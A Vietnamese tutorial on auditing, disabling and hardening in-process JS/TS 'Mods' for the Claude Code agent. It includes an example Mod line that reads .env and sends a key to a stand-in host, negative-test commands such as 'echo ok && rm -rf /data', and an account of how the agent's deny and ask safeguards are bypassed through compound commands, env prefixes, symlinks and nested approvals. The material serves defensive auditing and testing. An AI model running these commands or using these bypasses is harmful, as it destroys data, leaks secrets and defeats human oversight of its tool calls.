# 16 — Mods: bảo mật & validate (in-process JS/TS)

> **Bài này cho ai:** dev hoặc tech lead đang cài plugin có Mod và muốn biết Mod nguy hiểm tới đâu, audit thế nào, tắt ra sao.
> **Cần gì trước:** đã cài và đăng nhập ([bài 01](./01-cai-dat-va-xac-thuc.md)); nên đọc [bài 07 — Hooks](./07-hooks-tu-dong-hoa.md) và [bài 10 — Permissions](./10-permissions-modes-availability.md) trước — mục 3 và mục 7 luôn lấy hook/permission làm mốc so sánh.
> **Đọc xong bạn làm được:** nói được Mod làm được gì + thứ tự check tool call tầng nào thắng tầng nào; audit 1 Mod lạ bằng `plugin test` + `plugin validate`; tắt Mods 4 cách; viết negative test cho rule deny; chọn đúng bản npm có fix deny-bypass.
> **Thời gian:** ~40 phút

## Thuật ngữ

| Thuật ngữ | Nôm na 1 câu | Ví dụ kỹ thuật thật | Cách verify |
|---|---|---|---|
| Mod (in-process JS/TS) | Plugin sống chung nhà với Claude — thấy + sửa prompt/tool calls, khác khách (subprocess) chỉ đứng ngoài cổng | Mod gọi `$.fs.read(".env")` + `$.http.fetch("https://evil.test", {body: key})` | `claude plugin validate <name>` hiện `calls:` có `fs.read/http.fetch`; đọc source thấy URL lạ |
| Guard `sec-default@builtin` | Người gác có sẵn chặn lệnh nguy hiểm hiển nhiên — nhưng không lục được đồ trong cặp khách (Mod tự gọi) | Deny `Read(.env*)` chặn Claude đọc `.env` nhưng không chặn `$.fs.read(".env")` trong Mod | `claude --debug-file /tmp/mod-debug.log` tìm `sec-default/guard` có load không |
| Thứ tự check (managed>guard>mod>hook) | Ai to hơn thì thắng khi cãi nhau allow/deny | Managed deny vs user mod allow → deny thắng | Test: managed deny `rm -rf /data` + mod allow → `echo ok && rm -rf /data` vẫn BLOCK |

---

## 1. Mods là gì và vì sao phải học riêng?

```text
Mods = plugins JS/TS chạy IN-PROCESS (cùng process với Claude Code), từ
v2.1.287, ON BY DEFAULT. In-process = sống cùng nhà với secrets, prompt, tool
calls (không phải subprocess bị nhốt). Env CLAUDE_CODE_ENABLE_FUNCTION_HOOKS
bị LỜ từ bản này — cách tắt thật ở mục 6.
```

Hooks thường ([bài 07](./07-hooks-tu-dong-hoa.md)) là subprocess với JSON stdin/stdout — hỏng 1 lần chạy, muốn đọc secrets phải cố ý code thêm. Mods thì in-process, giữ state, thấy + sửa prompt/tool calls, gọi model, spawn process, fetch network — 1 Mod độc = keylogger + exfiltrator trong session bạn. Vì Mod ở cùng phòng với secrets, trust bar cao hơn plugin thường ([bài 09](./09-plugins-marketplaces.md)): chỉ cài bản đã audit (quy trình mục 5).

```bash
claude --version   # cần ≥2.1.287 mới có Mods on-by-default; thấp hơn → update
npm view @anthropic-ai/claude-code dist-tags   # so stable vs latest — số trên máy bạn mới đúng
```

---

## 2. Mod làm được gì

Bảng sự thật (đọc kỹ — mỗi dòng là 1 attack surface nếu Mod độc):

| Khả năng | Mod có? | Ý nghĩa rủi ro |
|---|---|---|
| Đọc/ghi file (`$.fs.read/write`) | ✅ | Đọc `.env`, key, cert; ghi backdoor |
| Spawn process (`$.process.run`) | ✅ | Chạy shell/tools ngoài, cài persistence |
| Network (`$.http.fetch`) | ✅ | Exfiltrate secrets ra ngoài |
| Đọc secrets env/settings (`$.env.get`, `$.settings.read`) | ✅ | `ANTHROPIC_API_KEY`, org policy, managed config |
| Thấy + sửa prompt/tool calls (`$.prompt.*`, `tool.check`) | ✅ | Đổi lệnh trước khi chạy, giấu findings |
| Approve trước prompt (`$.prompt.submit` gate) | ✅ | Cho qua cái bạn định chặn (nếu được ủy quyền) |
| Gọi model (sub-agent call) | ✅ | Tốn quota bạn, hoặc hỏi model để refine attack |
| Bị sandbox cover | ❌ | **Sandbox KHÔNG cover Mods** — đừng trông vào sandbox |

```text
Red flags (gặp là dừng, audit kỹ — mục 5): $.env.get (đọc env/key?) /
$.settings.read (policy/secrets?) / $.process.run (chạy gì? args từ đâu?) /
$.http.fetch (gửi đi đâu? body gì?) / $.prompt.submit (sửa gate?) /
tool.check (approve hộ?) / obfuscation (base64 blob, eval/Function).
```

---

## 3. Thứ tự check tool call (ai thắng ai)

Thứ tự cố định, không đổi:

```text
1. Managed hooks (org policy — cao nhất, không cãi)
2. Guard (sec-default@builtin — mục 4)
3. User mod (Mod bạn cài — chạy trước hooks thường!)
4. User hooks (PreToolUse command hooks — bài 07)

Deny ở tầng trên thắng allow ở tầng dưới. Allow dưới KHÔNG nới được deny trên.
```

| Mâu thuẫn ví dụ | Ai thắng | Vì sao |
|---|---|---|
| Managed deny vs user mod allow | Managed deny | Tầng 1 > tầng 3 |
| Guard deny vs user hook allow | Guard deny | Tầng 2 > tầng 4 |
| User mod allow vs user hook deny | Hook deny (vẫn hỏi tiếp) | Mod allow ≠ duyệt cuối — hook vẫn được chặn |
| User mod deny vs mọi allow dưới | Mod deny thắng | Tầng 3 > tầng 4; managed/guard vẫn trên Mod |

```text
2 hệ quả: (a) user mod CHẠY TRƯỚC user hooks → hook bạn viết chỉ thấy bản ĐÃ
QUA Mod (vì sao audit Mod quan trọng hơn audit hook). (b) Muốn CẤM CHẮC trước
Mod lạ? → managed hooks / guard deny (tầng trên), không phải thêm hook thường
(chạy sau Mod).
```

---

## 4. Guard `sec-default@builtin`

```text
sec-default@builtin = guard có sẵn của hệ thống, chặn các tool calls nguy hiểm
hiển nhiên (đọc key, ghi ngoài repo, pipe-to-shell...). CHỈ LOAD khi có managed
settings (org policy) HOẶC login Team/Enterprise — session cá nhân thuần thì
guard KHÔNG load, đừng tưởng "có guard lưng". Kiểm tra bằng debug log, đừng đoán.

2 giới hạn của guard:
- Deny giữ được (Mod thường không vượt qua), nhưng ask / PreToolUse-user /
  auto-classifier VẪN VƯỢT ĐƯỢC (Mod can thiệp approval flow ở gate "hỏi").
  → Chỉ DENY mới là tường; ask là cửa có người gác mà Mod đánh lạc hướng được.
- Điểm mù lớn nhất: guard deny chỉ chặn calls DO CLAUDE gọi. Calls do MOD tự
  gọi ($.fs.read, $.http.fetch trong code Mod) → KHÔNG qua guard. Deny
  Read(.env*) chặn Claude đọc .env ✓ nhưng Mod $.fs.read(".env") + fetch ra
  ngoài vẫn lọt ✗. → Guard chống model ẩu, KHÔNG chống Mod độc. Chống Mod độc
  chỉ có: audit trước khi cài (mục 5) + tắt khi nghi (mục 6).

# Kiểm tra guard có load không:
claude --debug-file /tmp/mod-debug.log
# → mở log, tìm "sec-default" / "guard": có load? deny rules nào active?
# Không thấy → session này KHÔNG có guard lưng.
```

---

## 5. Quy trình audit: `plugin test` + `plugin validate`

Cài plugin/Mod lạ = chạy code lạ in-process (mục 2). Nguồn có thể là marketplace, git URL, hay file `.zip`/URL tải tạm (`--plugin-dir ./plugin.zip`, `--plugin-url https://...`) — càng lạ càng phải audit trước, tin sau. Quy trình 5 bước:

### 5.1. Bước 1–2: chạy thử cách ly + check khai báo

```bash
claude plugin test <plugin-name>      # chạy thử cách ly: Mod nào load? hooks? permissions?
claude plugin validate <plugin-name> > /tmp/before.txt
# → đọc từng dòng: Mod nào? xin quyền gì? calls: nào? Có gì KHÔNG liên quan
#   chức năng quảng cáo? (vd: plugin format mà xin network?)
claude plugin details   # hỗ trợ: chi tiết plugin, gồm ước tính token cost
claude plugin eval      # hỗ trợ: đánh giá plugin trước khi tin — cần ≥2.1.269
```

### 5.2. Bước 3–4: đọc `hooks:`/`calls:` + red flags checklist

```text
Mở manifest + Mod source: hooks: đăng ký events nào? (càng rộng càng soi —
Mod format không cần prompt gate). calls:: đối chiếu red flags mục 2, mỗi hit
ghi: ĐỂ LÀM GÌ? có cần không?

[ ] $.env.get / $.settings.read — đọc gì? có key/secret? thực sự cần?
[ ] $.process.run — lệnh gì? args có từ input ngoài (prompt-injection?)
[ ] $.http.fetch — URL nào? body gì? domain lạ / IP số?
[ ] $.prompt.submit / tool.check — sửa gate/approve hộ theo logic gì? có lỏng?
[ ] Obfuscation: base64 blob, eval/Function(), code khó đọc bất thường?
[ ] Update: Mod tự update từ URL nào? (review update MỖI lần — bước 5)
```

### 5.3. Bước 5: review update mỗi lần dùng

```text
Audit 1 lần KHÔNG đủ: update có thể thêm Mod/quyền mới SAU khi bạn đã tin.
Pin version (đừng auto-latest cho plugin có Mod). Mỗi update: validate lại +
diff calls:/permissions mới. Có $.http.fetch mới mà changelog không nói?
→ dừng, hỏi tác giả. Changelog là gợi ý, DIFF mới là sự thật.

# Diff nhanh sau update:
claude plugin validate <plugin-name> > /tmp/after.txt
diff /tmp/before.txt /tmp/after.txt
# → calls:/permissions/hooks: nào MỚI? Đối chiếu changelog. Không khớp → điều tra.
```

Chi tiết lệnh: [commands/plugin-validate](./commands/knowledge-system/plugin-validate/README.md).

---

## 6. Tắt Mods (4 cách, từ nhẹ tới nặng)

```text
Cách 1 — safe-mode 1 session: Mods/hooks ngoài không load, chỉ còn built-in.
  Dùng khi nghi Mod break 1 task cụ thể, muốn đối chứng.
Cách 2 — disableAllHooks mọi session: tắt TẤT CẢ hooks (gồm Mods). Dùng khi
  dọn tổng, audit lại từng plugin. Nhớ bật lại có kiểm soát — đừng tắt
  vĩnh viễn rồi quên.
Cách 3 — --bare cho API runs: không Mods/hooks/skills — CI cần deterministic (bài 12).
Cách 4 — policy mod khóa cứng (org/máy chung): allowManagedModsOnly +
  disableSideloadFlags + prependPlugins (policy mod chạy ĐẦU) + .catch refuse.
  Chỉ Mods org duyệt được chạy; cấm sideload flags lạ.
```

```bash
claude --safe-mode              # cách 1: 1 session sạch
# settings: { "disableAllHooks": true }   # cách 2: mọi session
claude --bare -p "..."          # cách 3: API run sạch (CI)
# cách 4: managed policy JSON (org admin) — tên flags chính xác xem docs bản bạn:
# { "allowManagedModsOnly": true, "disableSideloadFlags": true,
#   "prependPlugins": ["org-policy-mod"], ".catch": "refuse" }
```

---

## 7. Sửa deny-bypass (v2.1.288/289)

```text
Bối cảnh: .287 bật Mods on-by-default → lộ các cách LÁCH deny qua Bash.
.288/.289 vá 4 họ. Còn ở ≤.287 là đang HỞ — upgrade trước (mục 8), rồi hiểu
từng họ để viết rule đúng.
```

### 7.1. 4 họ bypass + fix

```text
Họ 1 — Compound commands (&& / | / ;): deny "rm -rf /data" nhưng
  "echo ok && rm -rf /data" lọt. Fix: TÁCH SEGMENTS trên && || ; | (tôn trọng
  quotes), match TỪNG segment — 1 dính là block cả lệnh. Mẫu: bash-guard.sh.

Họ 2 — Env-prefix (TZ=.., FOO=bar ...): "TZ=UTC rm -rf /data" che lệnh thật.
  Fix: strip MỌI VAR= assignments đầu lệnh trước khi match.

Họ 3 — Symlink realpath: deny "/data" nhưng gọi qua symlink "/tmp/link" →
  "/data". Fix: resolve REALPATH rồi mới match. Lưu ý TOCTOU — việc critical
  vẫn cần hook + sandbox (bài 07, 10).

Họ 4 — Nested mod approval: Mod A gọi Mod B, approval của A bị dùng cho qua B.
  Fix: nested approval CHỈ MANAGED duyệt; user mod mặc định refuse. Whitelist
  từng cặp rõ ràng nếu thực sự cần.

Viết rule đúng sau fix (2 patterns):
- Deny interpreter: cấm `Bash(bash -c:*)` — chặn cả họ gói lệnh cấm trong
  quote (matcher không unquote sâu hết được). Kèm allow hẹp từng lệnh cần thiết.
- Allow rule cũng đáng ngờ: soát allow rộng ("Bash(*)", "bash:*") — thu hẹp từng cái.
```

---

## 8. npm stable hay latest + viết negative test

### 8.1. npm stable vs latest

```text
Stable (2.1.285 tại thời điểm viết): "được khuyên" cho số đông — nhưng CHƯA có
fix deny-bypass. Ở lại stable vì "ổn định" = ở lại với lỗ hổng.
Latest (2.1.289 lúc viết): đủ fix deny-bypass. Quy tắc: version = "có fix mình
cần" — đọc changelog từng bản, đừng tin số in trong bài (bản mới nhất thời điểm
viết là v2.1.296, 09/10/2026 — dist-tags máy bạn có thể cao hơn).

npm view @anthropic-ai/claude-code dist-tags
npm view @anthropic-ai/claude-code versions --json | tail -20
# → đối chiếu changelog có "deny-bypass" / "sec" fix?
claude --version
# → bản bạn đang chạy. < 2.1.289 → update rồi mới áp dụng mục 7.
```

### 8.2. Viết negative test cho rules từ changelog

```bash
# Negative test = test "cái XẤU phải bị chặn". Mỗi dòng changelog về security
# → ít nhất 1 negative test. Không có negative test thì fix chỉ tồn tại trên giấy.
# (hook/guard exit 2 khi block):
echo ok && rm -rf /data          # expect BLOCK (compound)
echo ok; rm -rf /data            # expect BLOCK
echo "a && b"                    # expect PASS (quotes — không false positive)
TZ=UTC rm -rf /data              # expect BLOCK (env-prefix)
A=1 B=2 rm -rf /data             # expect BLOCK
ln -s /data /tmp/link && rm -rf /tmp/link   # expect BLOCK (realpath)
bash -c 'rm -rf /data'           # expect BLOCK (deny interpreter)
# Họ nested mod: test trong plugin validate — user mod xin nested approval → REFUSE.
```

Đưa negative tests vào CI (tầng 4 bài 15): mỗi PR sửa rules/hooks phải chạy bộ này, test đỏ = rule hở → không merge — đây là cách "changelog thành guardrail".

---

## 9. Đi từng bước audit + pitfalls + bài tập

### 9.1. Walkthrough: audit 1 plugin có Mod (30 phút)

```text
Bước 1: claude --version (≥2.1.287?) + npm view dist-tags. < 2.1.289 → update.
Bước 2: claude plugin validate <plugin> > /tmp/before.txt. Đọc hooks:/calls:.
Bước 3: Đối chiếu red flags (mục 5.2). Ghi từng hit + cần/không cần + dòng code.
Bước 4: claude plugin test <plugin>. Quan sát Mod load + permissions xin.
Bước 5: Chạy negative tests (mục 8.2). PASS mà phải BLOCK? → fix rule (mục 7).
Bước 6: Thử safe-mode 1 session: task còn chạy? → biết mình phụ thuộc Mod tới đâu.
```

### 9.2. Pitfalls + fix

| Pitfall | Vì sao | Fix |
|---|---|---|
| Tưởng set `CLAUDE_CODE_ENABLE_FUNCTION_HOOKS=0` là tắt | Env này bị lờ từ .287 | Dùng 4 cách mục 6 |
| Tưởng sandbox cover Mods | Sandbox KHÔNG cover Mods | Audit + tắt, không trông sandbox |
| Tưởng guard deny chặn được Mod đọc `.env` | Deny chỉ cover Claude calls (mục 4) | Audit `$.fs.read` trong code Mod |
| Coi ask là tường | Ask vượt được, chỉ deny giữ được | Policy critical → deny, không ask |
| Hook thường để chống Mod độc | Mod chạy trước hooks (mục 3) | Chặn Mod → managed/guard (tầng trên) |
| Audit 1 lần rồi tin mãi | Update thêm quyền mới | Review update mỗi lần (diff validate — mục 5.3) |
| Ở npm stable .285 vì "ổn định" | Chưa có fix deny-bypass | Lên ≥.289 (check dist-tags thật) |
| Quên test compound/env-prefix/symlink | Rule hở mà tưởng kín | Negative tests mục 8.2 vào CI |

### 9.3. Bài tập thực hành

**Bài 1 (15 phút):** `npm view dist-tags` + `claude --version`. Bạn ở bản nào? Có fix deny-bypass chưa? 1 dòng kết luận + action.
**Bài 2 (15 phút):** Soát ALLOW rules: có allow rộng (`Bash(*)`, `bash -c`) không? Thu hẹp 1 rule + 2 negative tests (pass/block) chứng minh.
**Bài 3 (15 phút):** Lấy 1 plugin có Mod đang dùng. Validate + đối chiếu red flags (mục 5.2). Bảng: hit nào + cần/không + dòng code. Có obfuscation?
**Bài 4 (15 phút):** Chạy negative tests (mục 8.2) lên `templates/.claude/hooks/bash-guard.sh`. Ghi kết quả từng case. Fail? Sửa guard hoặc ghi issue.

## 10. Link chéo

- **[Bài 07 — Hooks](./07-hooks-tu-dong-hoa.md)**: viết PreToolUse hook, exit 2 block, hook deny thắng bypass.
- **[Bài 10 — Permissions](./10-permissions-modes-availability.md)**: deny/ask/allow rules, managed policy, prefix-matcher bẫy.
- **[Bài 15 — Security stack](./15-security-stack-5-tang.md)**: tầng 0–4, guidance ≠ guardrail, CI cửa cuối — Mod lạ là lỗ hổng nằm TRONG stack.
- **[Bài 09 — Plugins & marketplaces](./09-plugins-marketplaces.md)**: `claude plugin eval`/`install --marketplace`, trust bar của Mods với plugin thường.
- **[03-FAQ/09 — Bảo mật](../03-cau-hoi-thuong-gap/09-bao-mat-quyen-rieng-tu.md)**: câu hỏi thường gặp về Mods/bảo mật.
- **templates/.claude/hooks/bash-guard.sh**: mẫu guard tách segments + strip env-prefix.
